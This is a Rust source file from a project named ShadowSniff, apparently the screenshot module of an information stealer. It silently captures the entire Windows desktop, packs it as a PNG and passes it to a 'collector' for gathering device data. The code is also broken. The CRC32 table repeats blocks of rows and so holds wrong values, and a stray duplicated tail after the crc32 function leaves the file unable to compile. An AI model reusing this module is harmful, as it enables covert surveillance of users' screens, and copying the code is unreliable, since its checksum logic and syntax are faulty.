/*
 * This file is part of ShadowSniff (https://github.com/sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

use alloc::vec;
use alloc::vec::Vec;
use core::iter::once;
use core::mem::zeroed;
use core::ptr::null_mut;
use filesystem::path::Path;
use miniz_oxide::deflate::compress_to_vec_zlib;
use tasks::{Task, parent_name};

use collector::{Collector, Device};
use filesystem::{FileSystem, WriteTo};
use windows_sys::Win32::Graphics::Gdi::{
    BI_RGB, BITMAPINFO, BITMAPINFOHEADER, BitBlt, CreateCompatibleBitmap, CreateCompatibleDC,
    CreateDCW, DIB_RGB_COLORS, DeleteDC, DeleteObject, GetDIBits, SRCCOPY, SelectObject,
};
use windows_sys::Win32::UI::WindowsAndMessaging::{
    GetSystemMetrics, SM_CXVIRTUALSCREEN, SM_CYVIRTUALSCREEN, SM_XVIRTUALSCREEN, SM_YVIRTUALSCREEN,
};

pub struct ScreenshotTask;

impl<C: Collector, F: FileSystem> Task<C, F> for ScreenshotTask {
    parent_name!("Screenshot.png");

    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        let Ok((width, height, pixels)) = capture_screen() else {
            return;
        };

        let png = create_png(width as u32, height as u32, &pixels);
        let _ = &png.write_to(filesystem, parent);

        collector.get_device().set_screenshot(png);
    }
}

fn capture_screen() -> Result<(i32, i32, Vec<u8>), ()> {
    let (x, y, width, height) = unsafe {
        (
            GetSystemMetrics(SM_XVIRTUALSCREEN),
            GetSystemMetrics(SM_YVIRTUALSCREEN),
            GetSystemMetrics(SM_CXVIRTUALSCREEN),
            GetSystemMetrics(SM_CYVIRTUALSCREEN),
        )
    };

    let hdc = unsafe {
        CreateDCW(
            "DISPLAY"
                .encode_utf16()
                .chain(once(0))
                .collect::<Vec<u16>>()
                .as_ptr(),
            null_mut(),
            null_mut(),
            null_mut(),
        )
    };

    let hdc_mem = unsafe { CreateCompatibleDC(hdc) };
    let hbitmap = unsafe { CreateCompatibleBitmap(hdc, width, height) };
    let _old = unsafe { SelectObject(hdc_mem, hbitmap as *mut _) };

    unsafe {
        BitBlt(hdc_mem, 0, 0, width, height, hdc, x, y, SRCCOPY);
    }

    let mut bmi: BITMAPINFO = unsafe { zeroed() };
    bmi.bmiHeader.biSize = size_of::<BITMAPINFOHEADER>() as _;
    bmi.bmiHeader.biWidth = width;
    bmi.bmiHeader.biHeight = -height;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    let mut pixels = vec![0u8; (width * height * 4) as usize];
    let result = unsafe {
        GetDIBits(
            hdc_mem,
            hbitmap,
            0,
            height as u32,
            pixels.as_mut_ptr() as *mut _,
            &mut bmi as *mut _ as *mut _,
            DIB_RGB_COLORS,
        )
    };

    unsafe {
        DeleteObject(hbitmap as *mut _);
        DeleteDC(hdc_mem);
    }

    if result == 0 {
        return Err(());
    }

    let rgb_pixels: Vec<u8> = pixels
        .chunks_exact(4)
        .flat_map(|p| [p[2], p[1], p[0]])
        .collect();

    Ok((width, height, rgb_pixels))
}

fn create_png(width: u32, height: u32, pixels: &[u8]) -> Vec<u8> {
    let mut png = Vec::new();

    png.extend(b"\x89PNG\r\n\x1A\n");

    let mut ihdr = Vec::new();
    ihdr.extend(width.to_be_bytes());
    ihdr.extend(height.to_be_bytes());
    ihdr.extend([8, 2, 0, 0, 0]);
    append_chunk(&mut png, b"IHDR", &ihdr);

    let scanlines: Vec<u8> = pixels
        .chunks((width * 3) as usize)
        .flat_map(|row| [0x00].into_iter().chain(row.iter().copied()))
        .collect();

    let compressed = compress_to_vec_zlib(&scanlines, 6);
    append_chunk(&mut png, b"IDAT", &compressed);

    append_chunk(&mut png, b"IEND", &[]);

    png
}

// Precomputed CRC32 lookup table for polynomial 0xEDB88320
#[rustfmt::skip]
static CRC32_TABLE: [u32; 256] = [
    0x00000000, 0x77073096, 0xEE0E612C, 0x990951BA, 0x076DC419, 0x706AF48F, 0xE963A535, 0x9E6495A3,
    0x0EDB8832, 0x79DCB8A4, 0xE0D5E91E, 0x97D2D988, 0x09B64C2B, 0x7EB17CBD, 0xE7B82D07, 0x90BF1D91,
    0x1DB71064, 0x6AB020F2, 0xF3B97148, 0x84BE41DE, 0x1ADAD47D, 0x6DDDE4EB, 0xF4D4B551, 0x83D385C7,
    0x136C9856, 0x646BA8C0, 0xFD62F97A, 0x8A65C9EC, 0x14015C4F, 0x63066CD9, 0xFA0F3D63, 0x8D080DF5,
    0x3B6E20C8, 0x4C69105E, 0xD56041E4, 0xA2677172, 0x3C03E4D1, 0x4B04D447, 0xD20D85FD, 0xA50AB56B,
    0x35B5A8FA, 0x42B2986C, 0xDBBBC9D6, 0xACBCF940, 0x32D86CE3, 0x45DF5C75, 0xDCD60DCF, 0xABD13D59,
    0x26D930AC, 0x51DE003A, 0xC8D75180, 0xBFD06116, 0x21B4F4B5, 0x56B3C423, 0xCFBA9599, 0xB8BDA50F,
    0x2802B89E, 0x5F058808, 0xC60CD9B2, 0xB10BE924, 0x2F6F7C87, 0x58684C11, 0xC1611DAB, 0xB6662D3D,
    0x76DC4190, 0x01DB7106, 0x98D220BC, 0xEFD5102A, 0x71B18589, 0x06B6B51F, 0x9FBFE4A5, 0xE8B8D433,
    0x7807C9A2, 0x0F00F934, 0x9609A88E, 0xE10E9818, 0x7F6A0DBB, 0x086D3D2D, 0x91646C97, 0xE6635C01,
    0x6B6B51F4, 0x1C6C6162, 0x856530D8, 0xF262004E, 0x6C0695ED, 0x1B01A57B, 0x8208F4C1, 0xF50FC457,
    0x65B0D9C6, 0x12B7E950, 0x8BBEB8EA, 0xFCB9887C, 0x62DD1DDF, 0x15DA2D49, 0x8CD37CF3, 0xFBD44C65,
    0x4DB26158, 0x3AB551CE, 0xA3BC0074, 0xD4BB30E2, 0x4ADFA541, 0x3DD895D7, 0xA4D1C46D, 0xD3D6F4FB,
    0x4369E96A, 0x346ED9FC, 0xAD678846, 0xDA60B8D0, 0x44042D73, 0x133A11E5, 0x902AFF5F, 0xE710C9C9,
    0x6B6B51F4, 0x1C6C6162, 0x856530D8, 0xF262004E, 0x6C0695ED, 0x1B01A57B, 0x8208F4C1, 0xF50FC457,
    0x65B0D9C6, 0x12B7E950, 0x8BBEB8EA, 0xFCB9887C, 0x62DD1DDF, 0x15DA2D49, 0x8CD37CF3, 0xFBD44C65,
    0x4DB26158, 0x3AB551CE, 0xA3BC0074, 0xD4BB30E2, 0x4ADFA541, 0x3DD895D7, 0xA4D1C46D, 0xD3D6F4FB,
    0x4369E96A, 0x346ED9FC, 0xAD678846, 0xDA60B8D0, 0x44042D73, 0x133A11E5, 0x902AFF5F, 0xE710C9C9,
    0x2F6F7C87, 0x58684C11, 0xC1611DAB, 0xB6662D3D, 0x2802B89E, 0x5F058808, 0xC60CD9B2, 0xB10BE924,
    0x21B4F4B5, 0x56B3C423, 0xCFBA9599, 0xB8BDA50F, 0x26D930AC, 0x51DE003A, 0xC8D75180, 0xBFD06116,
    0x71B18589, 0x06B6B51F, 0x9FBFE4A5, 0xE8B8D433, 0x7807C9A2, 0x0F00F934, 0x9609A88E, 0xE10E9818,
    0x6B6B51F4, 0x1C6C6162, 0x856530D8, 0xF262004E, 0x6C0695ED, 0x1B01A57B, 0x8208F4C1, 0xF50FC457,
    0x65B0D9C6, 0x12B7E950, 0x8BBEB8EA, 0xFCB9887C, 0x62DD1DDF, 0x15DA2D49, 0x8CD37CF3, 0xFBD44C65,
    0x4DB26158, 0x3AB551CE, 0xA3BC0074, 0xD4BB30E2, 0x4ADFA541, 0x3DD895D7, 0xA4D1C46D, 0xD3D6F4FB,
    0x4369E96A, 0x346ED9FC, 0xAD678846, 0xDA60B8D0, 0x44042D73, 0x133A11E5, 0x902AFF5F, 0xE710C9C9,
    0x2F6F7C87, 0x58684C11, 0xC1611DAB, 0xB6662D3D, 0x2802B89E, 0x5F058808, 0xC60CD9B2, 0xB10BE924,
    0x21B4F4B5, 0x56B3C423, 0xCFBA9599, 0xB8BDA50F, 0x26D930AC, 0x51DE003A, 0xC8D75180, 0xBFD06116,
    0x76DC4190, 0x01DB7106, 0x98D220BC, 0xEFD5102A, 0x71B18589, 0x06B6B51F, 0x9FBFE4A5, 0xE8B8D433,
    0x7807C9A2, 0x0F00F934, 0x9609A88E, 0xE10E9818, 0x7F6A0DBB, 0x086D3D2D, 0x91646C97, 0xE6635C01,
    0x6B6B51F4, 0x1C6C6162, 0x856530D8, 0xF262004E, 0x6C0695ED, 0x1B01A57B, 0x8208F4C1, 0xF50FC457,
    0x65B0D9C6, 0x12B7E950, 0x8BBEB8EA, 0xFCB9887C, 0x62DD1DDF, 0x15DA2D49, 0x8CD37CF3, 0xFBD44C65,
    0x4DB26158, 0x3AB551CE, 0xA3BC0074, 0xD4BB30E2, 0x4ADFA541, 0x3DD895D7, 0xA4D1C46D, 0xD3D6F4FB,
    0x4369E96A, 0x346ED9FC, 0xAD678846, 0xDA60B8D0, 0x44042D73, 0x133A11E5, 0x902AFF5F, 0xE710C9C9,
];

fn crc32(bytes: &[u8]) -> u32 {
    let mut crc: u32 = 0xFFFFFFFF;
    
    // Use precomputed lookup table for faster computation
    for &byte in bytes {
        crc = (crc >> 8) ^ CRC32_TABLE[((crc ^ (byte as u32)) & 0xFF) as usize];
    }
    
    !crc
}
    }

    crc ^ 0xFFFFFFFF
}

fn append_chunk(png: &mut Vec<u8>, chunk_type: &[u8; 4], data: &[u8]) {
    let mut chunk_bytes = Vec::new();
    chunk_bytes.extend_from_slice(chunk_type);
    chunk_bytes.extend_from_slice(data);

    let crc = crc32(&chunk_bytes);

    png.extend(&(data.len() as u32).to_be_bytes());
    png.extend_from_slice(chunk_type);
    png.extend_from_slice(data);
    png.extend(&crc.to_be_bytes());
}
